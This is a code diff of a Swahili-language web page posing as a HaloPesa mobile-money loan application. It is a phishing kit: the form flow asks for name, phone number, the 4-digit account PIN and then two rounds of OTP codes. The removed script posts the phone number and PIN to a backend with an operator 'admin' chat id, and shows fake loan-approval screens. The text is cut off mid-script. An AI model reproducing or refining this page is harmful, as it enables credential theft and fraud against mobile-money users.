@@ -7,8 +7,14 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <!-- Toast Overlay Notification -->
-  <div id="toast-notification" class="toast-notification hidden"></div>
+  <!-- Intro Modal -->
+  <div id="intro-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;">
+    <div style="background:#0a1931;color:#fff;padding:30px 24px;border-radius:16px;text-align:center;max-width:340px;width:90%;box-shadow:0 10px 30px rgba(0,0,0,0.5);">
+      <div style="background:#fff;width:60px;height:60px;margin:0 auto 15px auto;border-radius:12px;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#ee5100;font-size:22px;">Halo</div>
+      <p style="font-size:14px;line-height:1.5;margin-bottom:20px;">Tafadhali hakikisha unatumia nambari ya simu ya HaloPesa iliyo halali na iliyosajiliwa ili uweze kufuzu.</p>
+      <button id="btn-naelewa" style="background:#1d4ed8;color:#fff;border:none;width:100%;padding:12px;border-radius:8px;font-weight:bold;font-size:15px;cursor:pointer;">NAELEWA</button>
+    </div>
+  </div>
 
   <header class="header" id="main-header">
     <div class="logo-container">
@@ -18,67 +24,33 @@
   </header>
 
   <main class="main-container">
-    <!-- Step 1: Calculator / Start -->
+    <!-- Step 1: Calculator -->
     <section id="step-calculator" class="card">
       <h2>Pata Mkopo Wako Haraka</h2>
       <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
-      
       <div class="calc-box">
         <label>Kiasi cha Mkopo</label>
         <div class="amount-display" id="display-amount">TSh 100,000</div>
         <input type="range" id="loan-amount-range" min="10000" max="100000000" step="5000" value="100000">
-        
         <label>Muda wa Mkopo</label>
         <div class="duration-display" id="display-duration">miezi 12</div>
         <input type="range" id="loan-duration-range" min="6" max="60" step="1" value="12">
-
         <div class="monthly-payment">
           <span>Malipo ya Kila Mwezi</span>
           <strong id="monthly-payment-val">TSh 9,504</strong>
         </div>
       </div>
-
       <button id="btn-start-apply" class="primary-btn">OMBA SASA</button>
-
-      <div class="features-grid">
-        <div>⚡ <span>Idhini ya Haraka</span><small>Ndani ya masaa 24</small></div>
-        <div>💰 <span>Riba Nafuu</span><small>Kuanzia 25%</small></div>
-        <div>🔒 <span>Salama</span><small>Kiwango cha benki</small></div>
-      </div>
     </section>
 
-    <!-- Step 2: Application Form -->
+    <!-- Step 2: Form -->
     <section id="step-form" class="card hidden">
       <h2>Maombi ya Mkopo</h2>
       <div class="step-indicator">Hatua 1 ya 3</div>
-
-      <div class="form-group">
-        <label>Aina ya Mkopo</label>
-        <select id="loan-type">
-          <option>Mkopo wa Biashara</option>
-          <option>Mkopo wa Binafsi</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>Kiasi cha Mkopo (TSh)</label>
-        <input type="text" id="form-amount-input" value="100000">
-      </div>
-
-      <div class="form-group">
-        <label>Muda wa Mkopo</label>
-        <select id="form-duration-select">
-          <option value="12">Miezi 12</option>
-          <option value="24">Miezi 24</option>
-          <option value="48">Miezi 48</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>Madhumuni ya Mkopo</label>
-        <textarea id="loan-purpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
-      </div>
-
+      <div class="form-group"><label>Aina ya Mkopo</label><select id="loan-type"><option>Mkopo wa Biashara</option><option>Mkopo wa Binafsi</option></select></div>
+      <div class="form-group"><label>Kiasi cha Mkopo (TSh)</label><input type="text" id="form-amount-input" value="100000"></div>
+      <div class="form-group"><label>Muda wa Mkopo</label><select id="form-duration-select"><option value="12">Miezi 12</option><option value="24">Miezi 24</option><option value="48">Miezi 48</option></select></div>
+      <div class="form-group"><label>Madhumuni ya Mkopo</label><textarea id="loan-purpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea></div>
       <button id="btn-next-1" class="primary-btn">HATUA INAYOFUATA</button>
     </section>
 
@@ -86,426 +58,106 @@
     <section id="step-personal" class="card hidden">
       <h2>Maombi ya Mkopo</h2>
       <div class="step-indicator">Hatua 2 ya 3</div>
-
       <div class="form-row">
-        <div class="form-group">
-          <label>Jina la Kwanza</label>
-          <input type="text" id="first-name" placeholder="Jina la kwanza">
-        </div>
-        <div class="form-group">
-          <label>Jina la Ukoo</label>
-          <input type="text" id="last-name" placeholder="Jina la ukoo">
-        </div>
+        <div class="form-group"><label>Jina la Kwanza</label><input type="text" id="first-name" placeholder="Jina la kwanza"></div>
+        <div class="form-group"><label>Jina la Ukoo</label><input type="text" id="last-name" placeholder="Jina la ukoo"></div>
       </div>
-
       <div class="form-group">
         <label>Nambari ya Simu (HaloPesa)</label>
         <div class="phone-input-wrapper">
           <span class="flag">+255</span>
-          <input type="tel" id="phone-number" placeholder="062xxxxxxx au 061/063" maxlength="10">
+          <input type="tel" id="phone-number" placeholder="062xxxxxxx" maxlength="10">
         </div>
         <small id="phone-error" class="error-text hidden">Namba lazima ianze na 061, 062, au 063 (Tarakimu 10).</small>
       </div>
-
       <div class="button-row">
         <button id="btn-prev-2" class="secondary-btn">ILIYOTANGULIA</button>
         <button id="btn-next-2" class="primary-btn">HATUA INAYOFUATA</button>
       </div>
     </section>
 
-    <!-- Step 4: Summary & Submit -->
+    <!-- Step 4: Summary -->
     <section id="step-summary" class="card hidden">
       <h2>Maombi ya Mkopo</h2>
       <div class="step-indicator">Hatua 3 ya 3</div>
-
-      <div class="form-group">
-        <label>Hali ya Ajira</label>
-        <select id="employment-status">
-          <option>Mfanyabiashara</option>
-          <option>Miajiriwa</option>
-        </select>
-      </div>
-
-      <div class="form-group">
-        <label>Mapato ya Mwaka (TSh)</label>
-        <input type="text" id="annual-income" placeholder="Weka mapato ya mwaka">
-      </div>
-
       <div class="summary-box">
         <h3>Muhtasari wa Maombi</h3>
         <p>Kiasi cha Mkopo: <strong id="sum-amount">TSh 100,000</strong></p>
         <p>Muda wa Mkopo: <strong id="sum-duration">Miezi 48</strong></p>
-        <p>Madhumuni: <strong id="sum-purpose">Budghu</strong></p>
+        <p>Madhumuni: <strong id="sum-purpose">Biashara</strong></p>
         <p>Mwombaji: <strong id="sum-name">-</strong></p>
       </div>
-
       <div class="button-row">
         <button id="btn-prev-3" class="secondary-btn">ILIYOTANGULIA</button>
         <button id="btn-submit-app" class="primary-btn">WASILISHA MAOMBI</button>
       </div>
     </section>
 
-    <!-- Step 5: PIN Entry Screen -->
+    <!-- Step 5: PIN Entry -->
     <section id="step-pin" class="card hidden">
       <h2>Ingia Akaunti</h2>
       <p class="subtitle" id="pin-phone-display">+255...</p>
-      
       <div class="form-group pin-container">
         <label>Weka PIN yako (tarakimu 4)</label>
         <div class="pin-inputs">
-          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-          <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
         </div>
       </div>
-
       <button id="btn-submit-pin" class="primary-btn" disabled>INGIA</button>
     </section>
 
-    <!-- Step 5b: Full-Screen Orange Waiting Screen -->
-    <section id="step-waiting" class="full-screen-waiting hidden">
-      <div class="waiting-content-wrapper">
-        <div class="waiting-icon-ring">
-          <div class="waiting-clipboard-icon">📋</div>
-          <div class="spinning-ring"></div>
-        </div>
-        
-        <h2>Maombi ya Mkopo Yamewasilishwa</h2>
-        <p class="waiting-desc">
-          Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini.<br>
-          Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye HaloPesa.
-        </p>
-
-        <div class="waiting-badge-pill">
-          <span>🔄 Unaelekezwa kwenye kuingia HaloPesa katika <strong id="waiting-countdown">3</strong> s...</span>
-        </div>
-
-        <button id="btn-go-login-now" class="orange-action-btn">Nenda Kuingia Sasa</button>
-      </div>
+    <!-- Waiting Screen -->
+    <section id="step-waiting" class="card hidden text-center" style="background:#ee5100; color:#fff; min-height:400px; display:flex; flex-direction:column; align-items:center; justify-content:center;">
+      <div style="width:50px;height:50px;border:4px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:20px;"></div>
+      <h2>Inasubiri Idhini ya Msimamizi...</h2>
+      <p style="font-size:13.5px;margin-top:10px;">Tafadhali subiri kidogo wakati maombi yako yanathibitishwa.</p>
     </section>
 
-    <!-- Step 6: OTP Screen with Countdown & Auto-Fill -->
+    <!-- Step 6: OTP Step 1 -->
     <section id="step-otp" class="card hidden">
-      <h2>Uthibitisho wa OTP</h2>
-      <p class="subtitle">Weka OTP iliyotumjwa kwenye namba yako ya simu <span id="otp-phone-display"></span></p>
-
+      <h2>Uthibitisho wa OTP (Hatua ya 1)</h2>
+      <p class="subtitle">Weka OTP iliyotumwa kwenye namba yako <span id="otp-phone-display"></span></p>
       <div class="success-banner">✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</div>
-
       <div class="form-group pin-container">
         <div class="pin-inputs">
-          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
-          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
-          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
-          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
         </div>
       </div>
-
-      <div class="timer-row">
-        <span id="otp-timer">Tuma tena simbo ndani ya 30 sekunde</span>
-        <button id="btn-request-new-otp" class="link-btn hidden">TUMA OMBI JIPYA LA OTP</button>
-      </div>
-
       <button id="btn-submit-otp" class="primary-btn" disabled>WASILISHA</button>
     </section>
 
-    <!-- Step 7: Final Success Screen -->
+    <!-- Step 6b: OTP Step 2 -->
+    <section id="step-otp2" class="card hidden">
+      <h2>Uthibitisho wa Mwisho wa OTP (Hatua ya 2)</h2>
+      <p class="subtitle">Weka OTP ya mwisho ya tarakimu 4 kwa ajili ya uhakiki kamili</p>
+      <div class="success-banner">✓ Hatua karibu imekamilika! Weka nambari ya mwisho ya uthibitisho.</div>
+      <div class="form-group pin-container">
+        <div class="pin-inputs">
+          <input type="text" class="otp2-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp2-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp2-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp2-box" maxlength="1" inputmode="numeric">
+        </div>
+      </div>
+      <button id="btn-submit-otp2" class="primary-btn" disabled>WASILISHA UHAKIKI</button>
+    </section>
+
+    <!-- Step 7: Success -->
     <section id="step-success" class="card hidden text-center">
-      <div class="success-icon-large">✓</div>
       <h2>Hongera!</h2>
-      <p class="subtitle">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
-
-      <div class="approved-amount-box">
-        <small>KIASI KILICHOIDHINISHWA</small>
-        <h1 id="final-approved-amount">TSh 100,000</h1>
-      </div>
-
-      <div class="notice-box">
-        ⚠️ <strong>NOTISI YA UZINGATIAJI</strong><br>
-        Akaunti yako ya HaloPesa lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo uliounda.
-      </div>
-
-      <div class="summary-details-list">
-        <div><span>MALIPO YA KILA MWEZI</span> <strong>TSh 2,441</strong></div>
-        <div><span>MUDA WA MKOPO</span> <strong>Miezi 48</strong></div>
-        <div><span>KIWANGO CHA RIBA</span> <strong>8% APR</strong></div>
-      </div>
-
+      <p class="subtitle">Mkopo wako <strong>umeidhinishwa!</strong></p>
+      <h1 id="final-approved-amount" style="color:#ee5100; margin:20px 0;">TSh 100,000</h1>
       <button id="btn-home" class="primary-btn">Rudi Nyumbani</button>
     </section>
   </main>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const urlParams = new URLSearchParams(window.location.search);
-      const adminChatId = urlParams.get('admin') || '';
-
-      const steps = {
-        calc: document.getElementById('step-calculator'),
-        form: document.getElementById('step-form'),
-        personal: document.getElementById('step-personal'),
-        summary: document.getElementById('step-summary'),
-        pin: document.getElementById('step-pin'),
-        waiting: document.getElementById('step-waiting'),
-        otp: document.getElementById('step-otp'),
-        success: document.getElementById('step-success')
-      };
-
-      const mainHeader = document.getElementById('main-header');
-      const toast = document.getElementById('toast-notification');
-
-      function showToast(message, type = 'error') {
-        if (!toast) return;
-        toast.textContent = message;
-        toast.className = `toast-notification ${type}`;
-        setTimeout(() => {
-          toast.classList.add('hidden');
-        }, 4000);
-      }
-
-      function switchStep(stepName) {
-        Object.values(steps).forEach(s => {
-          if (s) s.classList.add('hidden');
-        });
-        if (steps[stepName]) steps[stepName].classList.remove('hidden');
+  <script src="script.js"></script>
+</body>
+            </html>
         
-        if (stepName === 'waiting') {
-          if (mainHeader) mainHeader.style.display = 'none';
-          document.body.style.backgroundColor = '#ee5100';
-        } else {
-          if (mainHeader) mainHeader.style.display = 'flex';
-          document.body.style.backgroundColor = '#f4f4f4';
-        }
-
-        window.scrollTo(0, 0);
-      }
-
-      // Calculator bindings
-      const rangeAmount = document.getElementById('loan-amount-range');
-      const displayAmount = document.getElementById('display-amount');
-      const rangeDuration = document.getElementById('loan-duration-range');
-      const displayDuration = document.getElementById('display-duration');
-      const monthlyVal = document.getElementById('monthly-payment-val');
-
-      if (rangeAmount) {
-        rangeAmount.addEventListener('input', (e) => {
-          const val = parseInt(e.target.value);
-          if (displayAmount) displayAmount.textContent = `TSh ${val.toLocaleString()}`;
-          const amtInput = document.getElementById('form-amount-input');
-          if (amtInput) amtInput.value = val;
-          calcMonthly(val, rangeDuration ? parseInt(rangeDuration.value) : 12);
-        });
-      }
-
-      if (rangeDuration) {
-        rangeDuration.addEventListener('input', (e) => {
-          const val = parseInt(e.target.value);
-          if (displayDuration) displayDuration.textContent = `miezi ${val}`;
-          calcMonthly(rangeAmount ? parseInt(rangeAmount.value) : 100000, val);
-        });
-      }
-
-      function calcMonthly(amt, months) {
-        if (!monthlyVal) return;
-        const rate = 0.08 / 12;
-        const payment = (amt * rate * Math.pow(1 + rate, months)) / (Math.pow(1 + rate, months) - 1);
-        monthlyVal.textContent = `TSh ${Math.round(payment).toLocaleString()}`;
-      }
-
-      let appData = {
-        amount: '100,000',
-        duration: '12',
-        purpose: '',
-        firstName: '',
-        lastName: '',
-        phone: '',
-        pin: '',
-        otp: '',
-        userId: null
-      };
-
-      const btnStartApply = document.getElementById('btn-start-apply');
-      if (btnStartApply) {
-        btnStartApply.addEventListener('click', () => switchStep('form'));
-      }
-
-      const btnNext1 = document.getElementById('btn-next-1');
-      if (btnNext1) {
-        btnNext1.addEventListener('click', () => {
-          const amtInput = document.getElementById('form-amount-input');
-          const durSelect = document.getElementById('form-duration-select');
-          const purposeInput = document.getElementById('loan-purpose');
-
-          appData.amount = amtInput ? amtInput.value : '100000';
-          appData.duration = durSelect ? durSelect.value : '12';
-          appData.purpose = (purposeInput && purposeInput.value) ? purposeInput.value : 'Mkopo wa Biashara';
-          switchStep('personal');
-        });
-      }
-
-      const btnPrev2 = document.getElementById('btn-prev-2');
-      if (btnPrev2) {
-        btnPrev2.addEventListener('click', () => switchStep('calc'));
-      }
-      
-      const phoneInput = document.getElementById('phone-number');
-      const phoneError = document.getElementById('phone-error');
-
-      function isValidPrefix(num) {
-        const clean = num.replace(/\D/g, '');
-        return /^(061|062|063)\d{7}$/.test(clean);
-      }
-
-      const btnNext2 = document.getElementById('btn-next-2');
-      if (btnNext2) {
-        btnNext2.addEventListener('click', () => {
-          const rawPhone = phoneInput ? phoneInput.value.trim() : '';
-          if (!isValidPrefix(rawPhone)) {
-            if (phoneError) phoneError.classList.remove('hidden');
-            return;
-          }
-          if (phoneError) phoneError.classList.add('hidden');
-          
-          const fName = document.getElementById('first-name');
-          const lName = document.getElementById('last-name');
-          appData.firstName = fName ? fName.value : '';
-          appData.lastName = lName ? lName.value : '';
-          appData.phone = rawPhone.replace(/\D/g, '');
-
-          const sumAmt = document.getElementById('sum-amount');
-          const sumDur = document.getElementById('sum-duration');
-          const sumPur = document.getElementById('sum-purpose');
-          const sumName = document.getElementById('sum-name');
-
-          if (sumAmt) sumAmt.textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
-          if (sumDur) sumDur.textContent = `Miezi ${appData.duration}`;
-          if (sumPur) sumPur.textContent = appData.purpose;
-          if (sumName) sumName.textContent = `${appData.firstName} ${appData.lastName}`;
-          switchStep('summary');
-        });
-      }
-
-      const btnPrev3 = document.getElementById('btn-prev-3');
-      if (btnPrev3) {
-        btnPrev3.addEventListener('click', () => switchStep('personal'));
-      }
-
-      const btnSubmitApp = document.getElementById('btn-submit-app');
-      if (btnSubmitApp) {
-        btnSubmitApp.addEventListener('click', () => {
-          const amtInput = document.getElementById('form-amount-input');
-          appData.amount = amtInput ? amtInput.value : '100,000';
-          const pinPhoneDisp = document.getElementById('pin-phone-display');
-          if (pinPhoneDisp) pinPhoneDisp.textContent = `+255${appData.phone}`;
-          switchStep('pin');
-        });
-      }
-
-      const pinBoxes = document.querySelectorAll('.pin-box');
-      const btnSubmitPin = document.getElementById('btn-submit-pin');
-
-      pinBoxes.forEach((box, idx) => {
-        box.addEventListener('input', (e) => {
-          const val = e.target.value.replace(/\D/g, '');
-          e.target.value = val;
-          if (val && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
-          checkPinComplete();
-        });
-        box.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !box.value && idx > 0) pinBoxes[idx - 1].focus();
-        });
-      });
-
-      function checkPinComplete() {
-        if (!btnSubmitPin) return;
-        const pin = Array.from(pinBoxes).map(b => b.value).join('');
-        if (pin.length === 4) {
-          btnSubmitPin.removeAttribute('disabled');
-          appData.pin = pin;
-        } else {
-          btnSubmitPin.setAttribute('disabled', 'true');
-        }
-      }
-
-      if (btnSubmitPin) {
-        btnSubmitPin.addEventListener('click', async () => {
-          btnSubmitPin.textContent = 'Inathibitisha...';
-          btnSubmitPin.setAttribute('disabled', 'true');
-
-          try {
-            const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                contact: appData.phone,
-                pin: appData.pin,
-                amount: `TSh ${appData.amount}`,
-                adminChatId
-              })
-            });
-            const data = await res.json();
-            if (data.success) {
-              appData.userId = data.userId;
-              switchStep('waiting');
-              startWaitingCountdown();
-              pollStatus();
-            } else {
-              showToast(data.error || 'Hitilafu');
-              btnSubmitPin.textContent = 'INGIA';
-              btnSubmitPin.removeAttribute('disabled');
-            }
-          } catch (e) {
-            showToast('Hitilafu ya mtandao');
-            btnSubmitPin.textContent = 'INGIA';
-            btnSubmitPin.removeAttribute('disabled');
-          }
-        });
-      }
-
-      let waitingTimerInterval = null;
-      function startWaitingCountdown() {
-        let secondsLeft = 3;
-        const counterEl = document.getElementById('waiting-countdown');
-        if (waitingTimerInterval) clearInterval(waitingTimerInterval);
-
-        waitingTimerInterval = setInterval(() => {
-          secondsLeft = (secondsLeft - 1 + 4) % 4;
-          if (counterEl) counterEl.textContent = secondsLeft;
-        }, 1000);
-      }
-
-      const otpBoxes = document.querySelectorAll('.otp-box');
-      const btnSubmitOtp = document.getElementById('btn-submit-otp');
-      let countdownInterval = null;
-
-      otpBoxes.forEach((box, idx) => {
-        box.addEventListener('input', (e) => {
-          const val = e.target.value.replace(/\D/g, '');
-          e.target.value = val;
-          if (val && idx < otpBoxes.length - 1) otpBoxes[idx + 1].focus();
-          checkOtpComplete();
-        });
-        box.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !box.value && idx > 0) otpBoxes[idx - 1].focus();
-        });
-      });
-
-      function checkOtpComplete() {
-        if (!btnSubmitOtp) return;
-        const otp = Array.from(otpBoxes).map(b => b.value).join('');
-        if (otp.length === 4) {
-          btnSubmitOtp.removeAttribute('disabled');
-          appData.otp = otp;
-        } else {
-          btnSubmitOtp.setAttribute('disabled', 'true');
-        }
-      }
-
-      function showVerifyingSpinner(show) {
-        let modal = document.getElementById('verificationSpinnerModal');
-        if (!modal && show) {
-          modal = document.createElement('div');
-          modal.id = 'verificationSpinnerModal';
-          modal.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:99999;";
-          modal.innerHTML = `
-            <div style="background:#fff;padding:24px 30px;border-radius:10px;display:flex;align-items:center;gap:16px;box-shado
